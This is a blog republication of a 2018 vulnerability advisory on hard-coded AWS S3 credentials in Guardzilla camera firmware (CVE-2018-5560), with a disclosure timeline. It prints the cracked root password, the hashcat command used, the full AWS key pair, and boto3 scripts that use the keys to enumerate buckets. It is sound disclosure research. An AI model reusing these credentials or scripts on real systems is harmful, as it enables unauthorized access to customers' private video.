<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Guardzilla IoT Video Camera Hard-Coded Credentials (CVE-2018-5560)</title>
    <meta name="description" content="The Guardzilla IoT-enabled home video surveillance system contains a shared Amazon S3 credential, used for storing saved video data." />
    <link rel="stylesheet" href="../assets/css/blog.css" />
  </head>
  <body>
    <header class="masthead">
      <div class="masthead__inner">
        <div class="brand">
          <a class="brand__link" href="../index.html">Charles Dardaman</a>
          <p class="brand__tagline">Security engineering, incident response, research.</p>
        </div>
        <nav class="site-nav" aria-label="Primary">
          <ul>
            <li><a href="../index.html#about">About</a></li>
            <li><a href="../index.html#writing">Writing</a></li>
            <li><a href="../index.html#connect">Connect</a></li>
          </ul>
        </nav>
      </div>
    </header>

    <header class="post-header">
      <h1>Guardzilla IoT Video Camera Hard-Coded Credentials (CVE-2018-5560)</h1>
      <p><time datetime="2018-12-27">December 27, 2018</time></p>
    </header>

    <main>
      <article>
        <p><em>Originally published at <a href="https://web.archive.org/web/20190116071337/https://www.0dayallday.org/guardzilla-video-camera-hard-coded-aws-credentials/" target="_blank" rel="noopener">https://www.0dayallday.org/guardzilla-video-camera-hard-coded-aws-credentials/</a>. An archived copy appears below.</em></p>

        <h2>Researcher Contact Information</h2>
        <table>
            <thead>
              <tr>
                <th>Name</th>
                <th>Contact</th>
                <th>Role</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>Nick McClendon</td>
                <td>[email&nbsp;protected]</td>
                <td>Dumped the firmware and extracted the binaries</td>
              </tr>
              <tr>
                <td>Andrew Mirghassemi</td>
                <td>[email&nbsp;protected]</td>
                <td>Dumped the firmware and extracted the binaries</td>
              </tr>
              <tr>
                <td>Charles Dardaman</td>
                <td><a href="https://twitter.com/CharlesDardaman" target="_blank" rel="noopener">@CharlesDardaman</a></td>
                <td>Found and extracted the AWS credentials from the binaries</td>
              </tr>
              <tr>
                <td>INIT_6</td>
                <td><a href="https://twitter.com/INIT_3" target="_blank" rel="noopener">@INIT_3</a></td>
                <td>Co-founder of 0DayAllDay, cracked the root password</td>
              </tr>
              <tr>
                <td>Chris</td>
                <td>[email&nbsp;protected]</td>
                <td>Co-founder of 0DayAllDay, AWS policy verification</td>
              </tr>
            </tbody>
          </table>

        <h2>Executive Summary</h2>
        <p>During the 0DAYALLDAY Research Event a vulnerability (<strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5560" target="_blank" rel="noopener">CVE-2018-5560</a></strong>) in the Guardzilla Security Video System (Model #: <strong>GZ521W</strong>) was discovered. The vulnerability lies within the design and implementation of Amazon Simple Storage Service (S3) credentials inside the Guardzilla security camera firmware. Accessing these S3 storage credentials is trivial for a moderately skilled attacker.</p>
        <p>Upon inspection of the access rights given to the S3 credentials within the analyzed firmware it was discovered that the embedded S3 credentials have unlimited access to all S3 buckets provisioned for that account.</p>
        <p>While no user data was accessed during our testing, the embedded S3 credentials could easily be used to view and download any stored file or video in the associated buckets.</p>
        <p>This issue is an instance of <a href="https://cwe.mitre.org/data/definitions/798.html" target="_blank" rel="noopener">CWE-798: Use of Hard-coded Credentials</a>. It has a CVSSv3 base score of <strong><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N" target="_blank" rel="noopener">8.6</a></strong>, since once the password is known, any unauthenticated user can collect the data from any affected system over the internet.</p>

        <h2>Product Description</h2>
        <p>The Guardzilla All-In-One Video Security System is a home security platform that provides indoor video surveillance. More information about the product can be found at the <a href="https://www.guardzilla.com/products/guardzilla-all-in-one-hd-wifi-video-security-camera/" target="_blank" rel="noopener">vendor’s website</a>. Only the GZ501W model was tested. It is not known if other models are affected.</p>

        <h2>Findings Overview</h2>
        <p>This section summarizes the strategic problems identified, risk ratings, and recommendations. The Detailed Testing section describes the attempted attacks, evidence (including screenshots), risk ratings, and potential solutions. The results from this testing as well as any additional details regarding any further exposure can be found in the Detailed Testing section.</p>
        <table>
            <tbody>
              <tr>
                <th scope="row">Device</th>
                <td>Guardzilla GZ521W Security Video System</td>
              </tr>
            </tbody>
          </table>
        <table>
            <thead>
              <tr>
                <th>Finding</th>
                <th>Risk Rating</th>
                <th>Remediation Status</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>Embedded S3 credentials unlimited access policy</td>
                <td>CRITICAL</td>
                <td>Vulnerable</td>
              </tr>
              <tr>
                <td>OpenSSL 1.0.1g multiple vulnerabilities</td>
                <td>HIGH</td>
                <td>Vulnerable</td>
              </tr>
            </tbody>
          </table>

        <h2>Strategic Recommendations</h2>
        <p>Strategic recommendations are those actions that can be taken by an organization to address the findings outlined in the findings overview section of this executive summary in a more generic and global way, rather than fixing individual problems instance by instance.</p>
        <p>Implementing one or more of these recommendations may greatly improve the security posture of an organization and/or reduce the attack surface or exposure of an application or environment as well as address multiple findings.</p>
        <p><strong>Recommendation for Guardzilla:</strong></p>
        <ul>
          <li>Review the source code of the various resources and services to verify that no data is being passed to potential malicious 3<sup>rd</sup> party providers.</li>
          <li>Limit the access policy of the associated embedded S3 credentials to minimize access to cross customer information.</li>
          <li>Audit any and all 3<sup>rd</sup> party libraries for vulnerabilities and update those libraries where necessary.</li>
        </ul>
        <p><strong>Benefits:</strong></p>
        <ul>
          <li>Remediate all the findings from CVE-2018-5560.</li>
          <li>Prevent the application from succumbing to future vulnerabilities.</li>
        </ul>

        <h2>Detailed Technical Description</h2>
        <p>During the event a Winbond SPIFlash chip (Model #: 25Q128FVSG) was identified. The data sheet for the chip can be found <a href="https://www.winbond.com/resource-files/w25q128fv_revhh1_100913_website1.pdf" target="_blank" rel="noopener">here</a>.</p>
        <p>Once the firmware was extracted from that chip it was identified to contain a SquashFS file system and a Journaling Flash File System version 2 (JFFS2) file system. It was also noted that the “Distribution Base” is Grain Media ARM Linux 3.3.</p>
        <p>Once these file systems were extracted with binwalk, the following string was found in the Message of the Day (MOTD):</p>
        <pre><code>Copyright (C) 2005 Faraday Corp. www.faraday.com.tw</code></pre>
        <p>It was also noted that the <code>/etc/shadow</code> file contained the following DES encrypted password for the root administrator account:</p>
        <pre><code>root:MvynOwD449PkM:0:0:99999:7:::</code></pre>
        <p>Because DES has been deprecated since 2005 it was trivially cracked with dual Nvidia GeForce GTX 1080 Ti graphics cards:</p>
        <pre><code>hashcat -m 1500 -a 3 -o ../guardzilla.found -O -i --increment-min=8 --increment-max=12 -w 3 -t 50 ../guardzilla.hash ?a?a?a?a?a?a?a?a?a?a?a?a?a</code></pre>
        <pre><code>Session..........: hashcat
Status...........: Cracked
Hash.Type........: descrypt, DES (Unix), Traditional DES
Hash.Target......: MvynOwD449PkM
Time.Started.....: Tue Oct  2 07:36:30 2018 (3 hours, 35 mins)
Time.Estimated...: Tue Oct  2 11:12:06 2018 (0 secs)
Guess.Mask.......: ?a?a?a?a?a?a?a?a [8]
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  1176.6 MH/s (49.11ms) @ Accel:8 Loops:1024 Thr:256 Vec:1
Speed.Dev.#2.....:   776.5 MH/s (106.80ms) @ Accel:16 Loops:1024 Thr:256 Vec:1
Speed.Dev.#*.....:  1953.0 MH/s
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 25226596581376/39062500000000 (64.58%)
Rejected.........: 0/25226596581376 (0.00%)
Restore.Point....: 201580544/312500000 (64.51%)
Candidates.#1....: sarKrvcz -> 9poL82dw
Candidates.#2....: AiLwoz3x -> jE3iABuo
HWMon.Dev.#1.....: Temp: 66c Fan: 99% Util: 99% Core:1797MHz Mem:5005MHz Bus:8
HWMon.Dev.#2.....: Temp: 82c Fan: 99% Util:100% Core:1632MHz Mem:4513MHz Bus:8</code></pre>
        <p>The recovered password: <strong>GMANCIPC</strong></p>
        <p>It was noted that during boot the <em>init</em> script launches <em>boot.sh</em> which in turn launches both <em>/mnt/mtd/startapp</em> and <em>/home/daemon.exe</em>. The <em>startapp</em> resource launches <em>vg_boot.sh</em> (which configures low level video settings) and <em>main.exe</em>. The following table represents the binary information for both <em>main.exe</em> and <em>daemon.exe</em>:</p>
        <table>
            <caption>Guardzilla core binary data</caption>
            <thead>
              <tr>
                <th>Binary</th>
                <th>Architecture</th>
                <th>Type</th>
                <th>EABI</th>
                <th>Link Type</th>
                <th>Interpreter</th>
                <th>Symbols</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>main.exe</td>
                <td>ELF 32-bit</td>
                <td>ARM</td>
                <td>5 version 1</td>
                <td>Dynamically linked</td>
                <td>/lib/ld-uClibc.so.0</td>
                <td>Stripped</td>
              </tr>
              <tr>
                <td>daemon.exe</td>
                <td>ELF 32-bit</td>
                <td>ARM</td>
                <td>5 version 1</td>
                <td>Dynamically linked</td>
                <td>/lib/ld-uClibc.so.0</td>
                <td>Not stripped</td>
              </tr>
            </tbody>
          </table>

        <h2>Embedded S3 Credentials Unlimited Access Policy</h2>
        <p>Once the binaries were extracted from the firmware they were analyzed in IDA Pro to determine if any vulnerabilities could be identified. Once <code>main.exe</code> had been disassembled and analyzed it was noted that a set of strings resembled AWS credentials:</p>
        <figure>
          <img src="../images/rodata-AWS.png" alt="IDA Pro screenshot showing AWS-related strings" />
        </figure>
        <p>Following the references, we can see that they are exports from the binary that are labeled: <code>accessKey</code>, <code>secretAccessKey</code>, <code>hostname</code>, and <code>bucket</code>. This format lines up with how AWS bucket keys are designed:</p>
        <figure>
          <img src="../images/data-AWS.png" alt="IDA Pro screenshot highlighting exported AWS credential strings" />
        </figure>
        <table>
            <tbody>
              <tr>
                <th scope="row">AccessKeyIdG</th>
                <td>AKIAJQDP34RKL7GGV7OQ</td>
              </tr>
              <tr>
                <th scope="row">secretAccessKeyG</th>
                <td>igH8yFmmpMbnkcUaCqXJIRIozKVaXaRhE7PWHAYa</td>
              </tr>
              <tr>
                <th scope="row">hostName</th>
                <td>s3.amazonaws.com</td>
              </tr>
              <tr>
                <th scope="row">bucket</th>
                <td>motion-detection</td>
              </tr>
            </tbody>
          </table>
        <p>The following script was developed to test the S3 credentials to determine if they were valid as well as determine what access writes the credentials had:</p>
        <pre><code>import boto3
# Create an S3 client
s3 = boto3.client('s3',
                  aws_access_key_id='AKIAJQDP34RKL7GGV7OQ',
                  aws_secret_access_key='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',
                  region_name='us-west-1')

try:
    result = s3.get_bucket_policy(Bucket='motion-detection')
    print(result)
except Exception as e:
    print(e)</code></pre>
        <p>When the script was run it errored out stating that no specific policy exists on the embedded credentials for the <code>motion-detection</code> bucket:</p>
        <pre><code>An error occurred (NoSuchBucketPolicy) when calling the GetBucketPolicy operation: The bucket policy does not exist</code></pre>
        <p>The previously mentioned script was modified to list any available S3 buckets accessible by the embedded credentials:</p>
        <pre><code>import boto3
# Create an S3 client
s3 = boto3.client('s3',
                  aws_access_key_id='AKIAJQDP34RKL7GGV7OQ',
                  aws_secret_access_key='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',
                  region_name='us-west-1')

try:
    result = s3.list_buckets()
    print(result)
except Exception as e:
    print(e)</code></pre>
        <p>Once run that script lists all buckets accessible by the embedded credentials:</p>
        <pre><code>{
    'Buckets': [{
        'CreationDate': datetime.datetime(2017, 2, 16, 21, 52, 52, tzinfo=tzutc()),
        'Name': 'elasticbeanstalk-us-west-2-036770821135'
    }, {
        'CreationDate': datetime.datetime(2018, 4, 5, 15, 45, 22, tzinfo=tzutc()),
        'Name': 'facial-detection'
    }, {
        'CreationDate': datetime.datetime(2017, 11, 8, 19, 38, 15, tzinfo=tzutc()),
        'Name': 'free-video-storage'
    }, {
        'CreationDate': datetime.datetime(2018, 3, 9, 20, 7, 19, tzinfo=tzutc()),
        'Name': 'free-video-storage-persist'
    }, {
        'CreationDate': datetime.datetime(2016, 8, 15, 19, 53, 12, tzinfo=tzutc()),
        'Name': 'gz-rds-backups'
    }, {
        'CreationDate': datetime.datetime(2017, 11, 8, 19, 37, 44, tzinfo=tzutc()),
        'Name': 'gz-test-bucket'
    }, {
        'CreationDate': datetime.datetime(2017, 11, 8, 19, 38, 29, tzinfo=tzutc()),
        'Name': 'motion-detection'
    }, {
        'CreationDate': datetime.datetime(2017, 11, 8, 19, 38, 47, tzinfo=tzutc()),
        'Name': 'premium-video-storage'
    }, {
        'CreationDate': datetime.datetime(2018, 3, 9, 20, 6, 47, tzinfo=tzutc()),
        'Name': 'premium-video-storage-persist'
    }, {
        'CreationDate': datetime.datetime(2018, 1, 25, 20, 41, 16, tzinfo=tzutc()),
        'Name': 'rekognition-video-console-demo-cmh-guardzilla-2918n05v5rvh'
    }, {
        'CreationDate': datetime.datetime(2017, 5, 17, 16, 1, 9, tzinfo=tzutc()),
        'Name': 'setup-videos'
    }, {
        'CreationDate': datetime.datetime(2018, 1, 24, 23, 0, 39, tzinfo=tzutc()),
        'Name': 'wowza-test-bucket'
    }],
    'Owner': {
        'ID': 'a3db77fe2a21093a2f0d471b0a9677f8aff7c3c7b7a4944b752ccc0c3a4a4af7',
        'DisplayName': 'geoff'
    }
}</code></pre>
        <p>Using the <a href="https://github.com/RhinoSecurityLabs/pacu" target="_blank" rel="noopener">PACU</a> AWS framework it was determined that the embedded credentials don’t have permission to gather further details on policies:</p>
        <pre><code>{
  "AccessKeyId": "AKIAJQDP34RKL7GGV7OQ",
  "Arn": "arn:aws:iam::036770821135:user/motion-detection",
  "Roles": null,
  "KeyAlias": "Guardzilla",
  "AccountId": "036770821135",
  "UserId": "AIDAJQRSLLW52U7GLHFYE",
  "Groups": [],
  "Policies": [],
  "Permissions": {
    "Deny": {},
    "Allow": {}
  },
  "SecretAccessKey": "igH8yFmmpMbnkcUaCqXJIRIozKVaXaRhE7PWHAYa",
  "UserName": "",
  "RoleName": null,
  "SessionToken": null,
  "PermissionsConfirmed": false
}</code></pre>
        <p>No further testing against the credentials was done to prevent the unintentional access of Guardzilla customer data.</p>

        <h2>OpenSSL 1.0.1g Multiple Vulnerabilities</h2>
        <p>It was also noted that an out-of-date OpenSSL library was being referenced inside the firmware. The following table represents the publicly identified vulnerabilities affecting OpenSSL version <strong>1.0.1g</strong>.</p>
        <table>
            <caption>OpenSSL 1.0.1g public vulnerabilities</caption>
            <thead>
              <tr>
                <th>CVE Number</th>
                <th>Date Published</th>
                <th>Risk Rating</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>CVE-2016-0705</td>
                <td>2016-03-03</td>
                <td>CRITICAL</td>
              </tr>
              <tr>
                <th colspan="3" scope="row">Description</th>
              </tr>
              <tr>
                <td colspan="3">Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key.</td>
              </tr>
              <tr>
                <td>CVE-2015-0292</td>
                <td>2015-03-19</td>
                <td>HIGH</td>
              </tr>
              <tr>
                <th colspan="3" scope="row">Description</th>
              </tr>
              <tr>
                <td colspan="3">Integer underflow in the EVP_DecodeUpdate function in crypto/evp/encode.c in the base64-decoding implementation in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via crafted base64 data that triggers a buffer overflow.</td>
              </tr>
              <tr>
                <td>CVE-2014-8176</td>
                <td>2015-06-12</td>
                <td>HIGH</td>
              </tr>
              <tr>
                <th colspan="3" scope="row">Description</th>
              </tr>
              <tr>
                <td colspan="3">The dtls1_clear_queues function in ssl/d1_lib.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h frees data structures without considering that application data can arrive between a ChangeCipherSpec message and a Finished message, which allows remote DTLS peers to cause a denial of service (memory corruption and application crash) or possibly have unspecified other impact via unexpected application data.</td>
              </tr>
              <tr>
                <td>CVE-2016-0797</td>
                <td>2016-03-03</td>
                <td>MEDIUM</td>
              </tr>
              <tr>
                <th colspan="3" scope="row">Description</th>
              </tr>
              <tr>
                <td colspan="3">Multiple integer overflows in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allow remote attackers to cause a denial of service (heap memory corruption or NULL pointer dereference) or possibly have unspecified other impact via a long digit string that is mishandled by the (1) BN_dec2bn or (2) BN_hex2bn function, related to crypto/bn/bn.h and crypto/bn/bn_print.c.</td>
              </tr>
              <tr>
                <td>CVE-2015-0287</td>
                <td>2015-03-19</td>
                <td>MEDIUM</td>
              </tr>
              <tr>
                <th colspan="3" scope="row">Description</th>
              </tr>
              <tr>
                <td colspan="3">The ASN1_item_ex_d2i function in crypto/asn1/tasn_dec.c in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a does not reinitialize CHOICE and ADB data structures, which might allow attackers to cause a denial of service (invalid write operation and memory corruption) by leveraging an application that relies on ASN.1 structure reuse.</td>
              </tr>
              <tr>
                <td>CVE-2015-0209</td>
                <td>2015-03-19</td>
                <td>MEDIUM</td>
              </tr>
              <tr>
                <th colspan="3" scope="row">Description</th>
              </tr>
              <tr>
                <td colspan="3">Use-after-free vulnerability in the d2i_ECPrivateKey function in crypto/ec/ec_asn1.c in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a might allow remote attackers to cause a denial of service (memory corruption and application crash) or possibly have unspecified other impact via a malformed Elliptic Curve (EC) private-key file that is improperly handled during import.</td>
              </tr>
            </tbody>
          </table>

        <h2>Informational Findings</h2>
        <p>During the review it was noted that the Guardzilla camera listens on port 23 with an “ipc login” prompt by default. It was also noted a large amount of UDP traffic was being sent to a US-EAST-2 Amazon server. We also noted several HTTP requests going out to:</p>
        <pre><code>54.68.243.114 (ec2-54-68-243-114.us-west-2.compute.amazonaws.com)
http://54.68.243.114/apns/apns.php?cmd=reg_server&amp;uid=G1KEXWU2BPWHCFZ5111A
http://54.68.243.114/apns/apns.php?cmd=raise_event&amp;uid=G1KEXWU2BPWHCFZ5111A&amp;event_type=1&amp;event_time=1538239032
52.218.200.66 (s3-us-west-2-w.amazonaws.com)</code></pre>
        <p>During the binary review several external IP's were identified as well as several external data sources. The following table represents all identified external IPs and data sources identified within the <strong>main.exe</strong> binary:</p>
        <table>
            <caption>Guardzilla main.exe external hardcoded IP and data sources</caption>
            <thead>
              <tr>
                <th>Host</th>
                <th>Data source information</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>61.220.62.219</td>
                <td>HiNet, Taiwan</td>
              </tr>
              <tr>
                <td>203.69.81.91</td>
                <td>HiNet, Taiwan</td>
              </tr>
              <tr>
                <td>210.61.248.232</td>
                <td>HiNet, Taiwan</td>
              </tr>
              <tr>
                <td>42.99.254.162</td>
                <td>Pacnet Services, Japan</td>
              </tr>
              <tr>
                <td>50.19.254.134</td>
                <td>Amazon US-EAST-1, Virginia</td>
              </tr>
              <tr>
                <td>122.248.234.207</td>
                <td>Amazon AP-SOUTHEAST-1, Singapore</td>
              </tr>
              <tr>
                <td>46.137.188.54</td>
                <td>Amazon EU-WEST-1, Ireland</td>
              </tr>
              <tr>
                <td>122.226.84.253</td>
                <td>China Telecom, Jinhua, China</td>
              </tr>
              <tr>
                <td>61.188.37.216</td>
                <td>China Telecom, Chengdu, China</td>
              </tr>
              <tr>
                <td>120.24.59.150</td>
                <td>Alibaba, Hangzhou, China</td>
              </tr>
              <tr>
                <td>114.215.137.159</td>
                <td>Aliyun Computing, Hangzhou, China</td>
              </tr>
              <tr>
                <td>104.199.156.58</td>
                <td>Google Cloud</td>
              </tr>
              <tr>
                <td>175.41.238.100</td>
                <td>Amazon AP-NORTHEAST-1, Japan</td>
              </tr>
              <tr>
                <td>s3.amazonaws.com</td>
                <td>Amazon</td>
              </tr>
              <tr>
                <td>time.windows.com</td>
                <td>Microsoft</td>
              </tr>
              <tr>
                <td>m1.iotcplatform.com</td>
                <td>ThroughTek Co, China</td>
              </tr>
              <tr>
                <td>m2.iotcplatform.com</td>
                <td>ThroughTek Co, China</td>
              </tr>
              <tr>
                <td>m3.iotcplatform.com</td>
                <td>ThroughTek Co, China</td>
              </tr>
              <tr>
                <td>m4.iotcplatform.com</td>
                <td>ThroughTek Co, China</td>
              </tr>
              <tr>
                <td>m5.iotcplatform.com</td>
                <td>ThroughTek Co, China</td>
              </tr>
              <tr>
                <td>dropbox_sendFile_record_del</td>
                <td>Dropbox</td>
              </tr>
              <tr>
                <td>dropbox_sendFile_record_add</td>
                <td>Dropbox</td>
              </tr>
              <tr>
                <td>g_dropboxFileMutex</td>
                <td>Dropbox</td>
              </tr>
              <tr>
                <td>dropbox_sendFile_record_get</td>
                <td>Dropbox</td>
              </tr>
              <tr>
                <td>/mnt/nfs</td>
                <td>Local NFS</td>
              </tr>
            </tbody>
          </table>
        <p>The highlighted hosts should be further investigated to be sure no unintended video surveillance data is being sent to those hosts or providers. The <code>iotcplatform.com</code> host is especially troubling as it has been identified in previous <a href="https://krebsonsecurity.com/2016/02/this-is-why-people-fear-the-internet-of-things/" target="_blank" rel="noopener">Krebs on Security research</a>.</p>
        <p>It was also noted that a suspected UART port was identified on the circuit board. However, Guardzilla removed two pull-up resistors for production units. Replacement resistors were attempted and worked temporarily. We are confident with the correct surface mount resistors connected to the 3.3-volt line and RX and TX lines the UART port would be usable.</p>

        <h2>Disclosure Timeline</h2>
        <ul>
          <li>Sat, Sep 29, 2018: Issue discovered at 0DayAllDay Research Event.</li>
          <li>Wed, Oct 3, 2018: Issue disclosed to Rapid7 for coordinated disclosure.</li>
          <li>Wed, Oct 24, 2018: Issue disclosed to vendor.</li>
          <li>Thu, Nov 8, 2018: Issue disclosed to CERT/CC as VRF#18-11-NPPXC.</li>
          <li>Fri, Dec 14, 2018: CVE-2018-5560 reserved.</li>
          <li>Thu, Dec 27, 2018: Public disclosure.</li>
        </ul>
        <p>As of this writing the vendor hasn't responded to any communication from Rapid7 or CERT.</p>

        <h3>Special Thanks</h3>
        <ul>
          <li>Everyone at the 0DayAllDay Hacking Event!</li>
          <li><a href="https://geniusden.com/" target="_blank" rel="noopener">GeniusDen</a> for hosting our event.</li>
          <li>Rapid7 for coordinated disclosure.</li>
          <li>The creators of <a href="https://github.com/ReFirmLabs/binwalk" target="_blank" rel="noopener">Binwalk</a>, <a href="https://github.com/RhinoSecurityLabs/pacu" target="_blank" rel="noopener">PACU</a>, and <a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">Hashcat</a>.</li>
          <li><a href="https://twitter.com/hermit_hacker" target="_blank" rel="noopener">Hermit</a> for editing notes.</li>
        </ul>
      </article>
      <div class="footer">
        <a href="../index.html">← Back to homepage</a>
      </div>
    </main>

    <footer class="site-footer">
      <p>&copy; <span id="current-year"></span> Charles Dardaman</p>
    </footer>

    <script>
      const year = new Date().getFullYear();
      document.getElementById("current-year").textContent = year;
    </script>
  </body>
</html>
